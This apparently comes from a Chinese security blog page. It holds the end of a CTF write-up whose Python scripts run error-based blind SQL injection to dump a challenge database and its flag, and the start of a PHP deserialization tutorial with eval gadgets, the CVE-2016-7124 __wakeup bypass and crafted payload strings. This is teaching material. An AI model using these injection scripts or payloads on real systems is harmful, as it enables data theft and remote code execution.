<p>解释一下，substr(string, index, length)函数用于截取string字符串从index位开始长度为length的子串，ascii()函数用于将字符转换为ascii码，case (statement) when ‘..’ then ….. when ‘..’ then ….. end类似switch的用法，判断某个statement的值，如果满足下面when的某个条件就执行then后的语句。而pow(999,999)执行一定会报错（数据溢出）。故如果<code>ascii(substr(database(),1,1))</code>的值等于104的话，数据库会报错，回显something wrong.如果值不等于，则不执行，回显wrong username password.这样我们通过判断database()的每一位是否等于某个ascii码转换后的值，就可以得出数据库名。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">&quot;?user=1&#x27; and case (ascii(substr(database(), &#123;&#125;,1))) when &#x27;&#123;&#125;&#x27; then pow(999,999) end %23&amp;pass=123&quot;</span>.format(i, j)</span><br><span class="line">        url = <span class="string">&quot;http://v8.su29029.xyz:10010/index.php&quot;</span> + payload</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="comment"># print(j, end = &quot; &quot;)</span></span><br><span class="line">        <span class="keyword">if</span> (r.text.find(<span class="string">&#x27;Something wrong&#x27;</span>) != <span class="number">-1</span>):</span><br><span class="line">            print(chr(j))</span><br></pre></td></tr></table></figure>

<p>最终得到数据库名<code>hard_sql</code>.   </p>
<p>下一步爆表名。第二步payload：   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user&#x3D;1&#39; and case (ascii(substr((Select group_concat(table_name) from Information_schema.tables where table_schema&#x3D;&quot;hard_sql&quot;),1,1))) when &#39;102&#39; then pow(999,999) end %23pass&#x3D;123</span><br></pre></td></tr></table></figure>

<p>通过group_concat函数查询表名。   </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">&quot;?user=1&#x27; and case (ascii(substr((Select group_concat(table_name) from Information_schema.tables where table_schema=\&quot;hard_sql\&quot;), &#123;&#125;,1))) when &#x27;&#123;&#125;&#x27; then pow(999,999) end %23&amp;pass=123&quot;</span>.format(i, j)</span><br><span class="line">        url = <span class="string">&quot;http://v8.su29029.xyz:10010/index.php&quot;</span> + payload</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="comment"># print(j, end = &quot; &quot;)</span></span><br><span class="line">        <span class="keyword">if</span> (r.text.find(<span class="string">&#x27;Something wrong&#x27;</span>) != <span class="number">-1</span>):</span><br><span class="line">            print(chr(j))</span><br></pre></td></tr></table></figure>

<p>最终得到所有数据表名<code>flag,users</code>.   </p>
<p>最后一步获取列名，但是发现column被过滤且无法绕过，故考虑无列名注入。   </p>
<p>先判断列数，仍然使用上述payload来判断。   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user&#x3D;1&#39; and case (ascii(substr((Select &#96;1&#96; from (Select 1 union Select * from hard_sql.flag) as a limit 1,1), 1,1))) when &#39;1000&#39; then pow(999,999) end %23&amp;pass&#x3D;123</span><br></pre></td></tr></table></figure>

<p>发现提示something wrong.说明列数错误(因为ascii码值不可能等于1000，但是报错了说明是前面语句出现问题，在没有语法错误的情况下只可能是列数错误)，故增加列数，最后发现一共有5列。因为使用如下payload时没有提示something wrong 而是 wrong username password.   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user&#x3D;1&#39; and case (ascii(substr((Select &#96;1&#96; from (Select 1,2,3,4,5 union Select * from hard_sql.flag) as a limit 1,1), 1,1))) when &#39;1000&#39; then pow(999,999) end %23&amp;pass&#x3D;123</span><br></pre></td></tr></table></figure>

<p>爆出该表的所有列的所有内容(一行一行来)：   </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">127</span>, <span class="number">32</span>, <span class="number">-1</span>):</span><br><span class="line">            payload = <span class="string">&quot;?user=1&#x27; and case (ascii(substr((Select `&#123;&#125;` from (Select 1,2,3,4,5 union Select * from hard_sql.flag) as a limit 1,1), &#123;&#125;,1))) when &#x27;&#123;&#125;&#x27; then pow(999,999) end %23&amp;pass=123&quot;</span>.format(m, i, j)</span><br><span class="line">            url = <span class="string">&quot;http://v8.su29029.xyz:10010/index.php&quot;</span> + payload</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> (r.text.find(<span class="string">&#x27;Something wrong&#x27;</span>) != <span class="number">-1</span>):</span><br><span class="line">                print(chr(j))</span><br><span class="line">                index = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> (index == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&quot;-----------------&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>最终结果：   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;&#123;&#123;&#123;&#123;&#123;&#123;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mini~~~</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;this_is_not_a_flag&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffllaagg&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sql_1s_s0_c00000001lllll!!!!!!&#125;</span><br></pre></td></tr></table></figure>
<p>最后一个是真正的flag。<br>成功获得flag。   </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://su29029.github.io/2020/08/28/V1lu0%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0hard-sql/" data-id="ckedn8mt9000efctycv3t9wdy" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-php反序列化总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/" class="article-date">
  <time datetime="2020-08-28T02:36:49.000Z" itemprop="datePublished">2020-08-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>►<a class="article-category-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/08/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/">php反序列化总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="总结php反序列化"><a href="#总结php反序列化" class="headerlink" title="总结php反序列化"></a>总结php反序列化</h2><h3 id="0x01什么是php反序列化"><a href="#0x01什么是php反序列化" class="headerlink" title="0x01什么是php反序列化"></a>0x01什么是php反序列化</h3><p>在php中，序列化是将对象转换为字节序列的过程，反序列化则是将字节序列恢复为对象的过程。该过程的意义是可以将一个对象通过可保存的字节方式进行存储，当需要的时候再通过反序列化来获取。</p>
<h3 id="0x02类的序列化与反序列化"><a href="#0x02类的序列化与反序列化" class="headerlink" title="0x02类的序列化与反序列化"></a>0x02类的序列化与反序列化</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>我们看一个简单的例子：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class cls &#123;</span><br><span class="line">	var $value &#x3D; &#39;123456&#39;;</span><br><span class="line">	function do()&#123;</span><br><span class="line">		echo &#39;do..&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new cls();</span><br><span class="line">print_r($a);</span><br><span class="line">print_r(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>运行结果：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cls Object</span><br><span class="line">(</span><br><span class="line">	[value] &#x3D;&gt; 123456</span><br><span class="line">)</span><br><span class="line">O:3:&quot;cls&quot;:1:&#123;s:5:&quot;value&quot;;s:6:&quot;123456&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到对象被序列化成了字节码，其中保留了类名，以及变量的相关信息，但是并没有函数的相关信息。<br>详细解释一下序列化之后的内容：O代表对象，3代表该对象的对象名长度为3，”cls”即对象名，1代表对象中有1个成员变量，随后大括号里面是对这个成员变量的描述，以“变量名;变量值;变量名;变量值;…”的方式来描述。s代表string，即字符串，5代表变量名长度，”value”即变量名，分号代表该变量名描述结束，随后是对变量值的描述，与对变量名的描述形式相同。<br>这里有两个特殊的点，如果序列化的对象成员变量为私有，例如cls类有一个私有成员<code>private $abc = &quot;123&quot;;</code>序列化之后的结果为<code>s:8:&quot;abc123&quot;</code>，这里为什么是8呢？是因为序列化的过程中，私有成员除了变量名前加了类名，还有两个不可见字符，即序列化后的结果实际为<code>s:8:&quot;%00abc%00123&quot;</code>，<code>%00</code>为url编码，解码后为不可见字符(有时候会显示成一个空格有时候不显示)，所以结果为8。<br>而如果序列化的对象成员是保护类型(即protected)，则序列化后的结果也会有差别，例如cls类有一个保护成员<code>private $abc = &quot;123&quot;;</code>序列化之后的结果为<code>s:5:&quot;*wa&quot;;</code>这里为什么是5呢？原因就是又生成了两个<code>%00</code>不可见字符，即真实结果为<code>s:5:&quot;%00*%00wa&quot;;</code>所以结果为5。<br>序列化后的字母标识符主要有O(对象Object)、s(字符串string)、i(整数integer)<br>当类中的变量是另一个类时，序列化过程中会将另一个类也进行序列化，例如：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class cls1&#123;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;value &#x3D; new cls2();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">class cls2&#123;</span><br><span class="line">	var $king &#x3D; &#39;cls2&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new cls1();</span><br><span class="line">print_r($a);</span><br><span class="line">print_r(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>运行结果：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cls1 Object</span><br><span class="line">(</span><br><span class="line">	[value] &#x3D;&gt; cls2 Object</span><br><span class="line">		(</span><br><span class="line">			[king] &#x3D;&gt; cls2</span><br><span class="line">		)</span><br><span class="line">)</span><br><span class="line">O:4:&quot;cls1&quot;:1:&#123;s:5:&quot;value&quot;;O:4:&quot;cls2&quot;:1:&#123;s:4:&quot;king&quot;;s:4:&quot;cls2&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到另一个类也被序列化了。  </p>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>反序列化会将字节码恢复成对象，看一个例子：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class aaaaa&#123;</span><br><span class="line">	var $asdf &#x3D; 1;</span><br><span class="line">	var $apple &#x3D; &quot;red&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; &#39;O:5:&quot;aaaaa&quot;:2:&#123;s:4:&quot;asdf&quot;;i:1;s:5:&quot;apple&quot;;s:3:&quot;red&quot;;&#125;&#39;;</span><br><span class="line">print_r(unserialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aaaaa Object</span><br><span class="line">(</span><br><span class="line">    [asdf] &#x3D;&gt; 1</span><br><span class="line">    [apple] &#x3D;&gt; red</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>可以看到字节码被成功恢复成了对象。<br>如果我们反序列化一个不存在的类，结果就会显示一个<code>__PHP_Incomplete_Class Object</code>:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &#39;O:5:&quot;aaaaa&quot;:2:&#123;s:4:&quot;asdf&quot;;i:1;s:5:&quot;apple&quot;;s:3:&quot;red&quot;;&#125;&#39;;</span><br><span class="line">print_r(unserialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>运行结果：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__PHP_Incomplete_Class Object</span><br><span class="line">(</span><br><span class="line">    [__PHP_Incomplete_Class_Name] &#x3D;&gt; aaaaa</span><br><span class="line">    [asdf] &#x3D;&gt; 1</span><br><span class="line">    [apple] &#x3D;&gt; red</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h3 id="0x03魔术方法-Magic-function"><a href="#0x03魔术方法-Magic-function" class="headerlink" title="0x03魔术方法(Magic function)"></a>0x03魔术方法(Magic function)</h3><p>魔术方法是一种类中的特殊方法，通常通过语法糖的形式被自动调用，所以当使用了一些语法糖的时候会无意间执行这些函数<br>一些常见的魔术方法：   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__construct() &#x2F;&#x2F; 对象创建时触发</span><br><span class="line">__wakeup() &#x2F;&#x2F; 使用unserrialize时触发</span><br><span class="line">__sleep() &#x2F;&#x2F; 使用serialize时触发</span><br><span class="line">__destruct() &#x2F;&#x2F;对象被销毁的时候触发</span><br><span class="line">__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问你的方法时触发</span><br><span class="line">__get() &#x2F;&#x2F;用于从不可访问的属性读取数据</span><br><span class="line">__set() &#x2F;&#x2F;用于将数据写入不可访问的属性</span><br><span class="line">__isset() &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()时触发</span><br><span class="line">__unset() &#x2F;&#x2F;在不可访问你的属性上使用unset()时触发</span><br><span class="line">__toString() &#x2F;&#x2F;把类当作字符串使用时触发</span><br><span class="line">__invoke() &#x2F;&#x2F;当脚本尝试将对昂调用为函数时触发</span><br></pre></td></tr></table></figure>
<h3 id="0x04-php反序列化漏洞"><a href="#0x04-php反序列化漏洞" class="headerlink" title="0x04 php反序列化漏洞"></a>0x04 php反序列化漏洞</h3><p>借助魔术方法/危险函数，我们可以通过反序列化控制类中的成员变量，从而实现文件读取，任意代码执行等操作。   </p>
<h4 id="直接利用"><a href="#直接利用" class="headerlink" title="直接利用"></a>直接利用</h4><p>当类中的危险函数在后面存在被调用时，就可以通过控制类中的变量，导致漏洞触发，例如：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class cls&#123;</span><br><span class="line">	var $value &#x3D; &#39;echo 123;&#39;;</span><br><span class="line">	function do()&#123;</span><br><span class="line">		eval($this-&gt;value);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; unserialize(&#39;O:3:&quot;cls&quot;:1:&#123;s:5:&quot;value&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#39;);</span><br><span class="line">$a-&gt;do();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">phpinfo()</span><br><span class="line">PHP Version &#x3D;&gt; 5.6.40-26+ubuntu18.04.1+deb.sury.org+1</span><br><span class="line"></span><br><span class="line">System &#x3D;&gt; Linux LAPTOP-FQL3FC52 4.19.104-microsoft-standard #1 SMP Wed Feb 19 06:37:35 UTC 2020 x86_64</span><br><span class="line">Server API &#x3D;&gt; Command Line Interface</span><br><span class="line">Virtual Directory Support &#x3D;&gt; disabled</span><br><span class="line">Configuration File (php.ini) Path &#x3D;&gt; &#x2F;etc&#x2F;php&#x2F;5.6&#x2F;cli</span><br><span class="line">Loaded Configuration File &#x3D;&gt; &#x2F;etc&#x2F;php&#x2F;5.6&#x2F;cli&#x2F;php.ini</span><br><span class="line">Scan this dir for additional .ini files &#x3D;&gt; &#x2F;etc&#x2F;php&#x2F;5.6&#x2F;cli&#x2F;conf.d</span><br><span class="line">Additional .ini files parsed &#x3D;&gt; &#x2F;etc&#x2F;php&#x2F;5.6&#x2F;cli&#x2F;conf.d&#x2F;10-opcache.ini</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<h4 id="危险函数在魔术方法中"><a href="#危险函数在魔术方法中" class="headerlink" title="危险函数在魔术方法中"></a>危险函数在魔术方法中</h4><p>如果类中不存在方法的直接调用，可以查看魔术方法中是否存在危险函数。例如：   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class cls&#123;</span><br><span class="line">	var $value &#x3D; &#39;echo 123;&#39;;</span><br><span class="line">	function __wakeup()&#123;</span><br><span class="line">		eval($this-&gt;value);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; unserialize(&#39;O:3:&quot;cls&quot;:1:&#123;s:5:&quot;value&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#39;);</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">phpinfo()</span><br><span class="line">PHP Version &#x3D;&gt; 5.6.40-26+ubuntu18.04.1+deb.sury.org+1</span><br><span class="line"></span><br><span class="line">System &#x3D;&gt; Linux LAPTOP-FQL3FC52 4.19.104-microsoft-standard #1 SMP Wed Feb 19 06:37:35 UTC 2020 x86_64</span><br><span class="line">Server API &#x3D;&gt; Command Line Interface</span><br><span class="line">Virtual Directory Support &#x3D;&gt; disabled</span><br><span class="line">Configuration File (php.ini) Path &#x3D;&gt; &#x2F;etc&#x2F;php&#x2F;5.6&#x2F;cli</span><br><span class="line">Loaded Configuration File &#x3D;&gt; &#x2F;etc&#x2F;php&#x2F;5.6&#x2F;cli&#x2F;php.ini</span><br><span class="line">Scan this dir for additional .ini files &#x3D;&gt; &#x2F;etc&#x2F;php&#x2F;5.6&#x2F;cli&#x2F;conf.d</span><br><span class="line">Additional .ini files parsed &#x3D;&gt; &#x2F;etc&#x2F;php&#x2F;5.6&#x2F;cli&#x2F;conf.d&#x2F;10-opcache.ini</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<h5 id="绕过-wakeup-CVE-2016-7124"><a href="#绕过-wakeup-CVE-2016-7124" class="headerlink" title="绕过__wakeup()[CVE-2016-7124]"></a>绕过__wakeup()[CVE-2016-7124]</h5><p>当序列化字符串中表示对象属性个数的值大于真实数量时，会绕过__wakeup()函数的执行，影响范围：php5 &lt; 5.6.25;php7 &lt; 7.0.10<br>举个例子：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    error_reporting(0);</span><br><span class="line">    class ABC&#123;</span><br><span class="line">        public $key &#x3D; &#39;emmm&#39;;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">            if(!empty($this-&gt;key))&#123;</span><br><span class="line">                if($this-&gt;key &#x3D;&#x3D; &#39;emmm&#39;)</span><br><span class="line">                    echo &#39;success&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        function __wakeup()&#123;</span><br><span class="line">            $this-&gt;key &#x3D; &#39;failed&#39;;</span><br><span class="line">            echo $this-&gt;key;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __toString()&#123;</span><br><span class="line">            return &#39;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if(!isset($_GET[&#39;answer&#39;]))&#123;</span><br><span class="line">        show_source(&#39;serializetest.php&#39;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $answer &#x3D; $_GET[&#39;answer&#39;];</span><br><span class="line">        echo unserialize($answer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
<p>故可构造序列化字符串<code>O:3:&quot;ABC&quot;:4:&#123;s:3:&quot;key&quot;;s:4:&quot;emmm&quot;;&#125;</code><br>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">success</span><br></pre></td></tr></table></figure>
<p>而如果按照正常的数量来写(1而不是4)的话，<code>O:3:&quot;ABC&quot;:1:&#123;s:3:&quot;key&quot;;s:4:&quot;emmm&quot;;&#125;</code><br>执行结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">failed</span><br></pre></td></tr></table></figure>
<h4 id="当危险函数在别的类中调用"><a href="#当危险函数在别的类中调用" class="headerlink" title="当危险函数在别的类中调用"></a>当危险函数在别的类中调用</h4><p>如果一个类中的成员变量是另一个类的对象，而另一个类中调用了危险函数，此时便可通过序列化前者，从而触发漏洞。例如：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class cls1&#123;</span><br><span class="line">	var $ser;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$ser &#x3D; new ser2();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __wakeup()&#123;</span><br><span class="line">		$this-&gt;ser-&gt;evil();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class cls2&#123;</span><br><span class="line">	var $value &#x3D; &quot;echo 123;&quot;;</span><br><span class="line">	function evil()&#123;</span><br><span class="line">		eval($this-&gt;value);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$cls &#x3D; $GET[&#39;cls&#39;];</span><br><span class="line">$instance &#x3D; unserialize($cls);</span><br></pre></td></tr></table></figure>
<p>我们可以构造序列化字符串<code>O:4:&quot;cls1&quot;:1:&#123;s:3:&quot;ser&quot;;O:4:&quot;cls2&quot;:1:&#123;s:5:&quot;value&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</code>，传入get中即可触发漏洞。<br>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">phpinfo()</span><br><span class="line">PHP Version &#x3D;&gt; 5.6.40-26+ubuntu18.04.1+deb.sury.org+1</span><br><span class="line"></span><br><span class="line">System &#x3D;&gt; Linux LAPTOP-FQL3FC52 4.19.104-microsoft-standard #1 SMP Wed Feb 19 06:37:35 UTC 2020 x86_64</span><br><span class="line">Server API &#x3D;&gt; Command Line Interface</span><br><span class="line">Virtual Directory Support &#x3D;&gt; disabled</span><br><span class="line">Configuration File (php.ini) Path &#x3D;&gt; &#x2F;etc&#x2F;php&#x2F;5.6&#x2F;cli</span><br><span class="line">Loaded Configuration File &#x3D;&gt; &#x2F;etc&#x2F;php&#x2F;5.6&#x2F;cli&#x2F;php.ini</span><br><span class="line">Scan this dir for additional .ini files &#x3D;&gt; &#x2F;etc&#x2F;php&#x2F;5.6&#x2F;cli&#x2F;conf.d</span><br><span class="line">Additional .ini files parsed &#x3D;&gt; &#x2F;etc&#x2F;php&#x2F;5.6&#x2F;cli&#x2F;conf.d&#x2F;10-opcache.ini</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
